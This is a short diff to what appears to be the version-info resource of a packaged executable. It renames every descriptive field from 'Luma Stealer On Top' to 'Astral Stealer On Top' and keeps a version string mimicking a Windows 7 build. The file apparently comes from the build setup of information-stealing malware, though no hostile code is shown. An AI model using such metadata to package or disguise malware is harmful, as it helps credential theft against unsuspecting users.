@@ -14,13 +14,13 @@ VSVersionInfo(
       [
       StringTable(
         u'040904B0',
-        [StringStruct(u'CompanyName', u'Luma Stealer On Top'),
-        StringStruct(u'FileDescription', u'Luma Stealer On Top'),
+        [StringStruct(u'CompanyName', u'Astral Stealer On Top'),
+        StringStruct(u'FileDescription', u'Astral Stealer On Top'),
         StringStruct(u'FileVersion', u'7.9.0.5.5489 (win7sp1_rtm.101119-1850)'),
-        StringStruct(u'InternalName', u'Luma Stealer On Top'),
-        StringStruct(u'LegalCopyright', u'Luma Stealer On Top'),
-        StringStruct(u'OriginalFilename', u'Luma Stealer On Top'),
-        StringStruct(u'ProductName', u'Luma Stealer On Top'),
+        StringStruct(u'InternalName', u'Astral Stealer On Top'),
+        StringStruct(u'LegalCopyright', u'Astral Stealer On Top'),
+        StringStruct(u'OriginalFilename', u'Astral Stealer On Top'),
+        StringStruct(u'ProductName', u'Astral Stealer On Top'),
         StringStruct(u'ProductVersion', u'7.9.0.0.5489')])
       ]), 
     VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
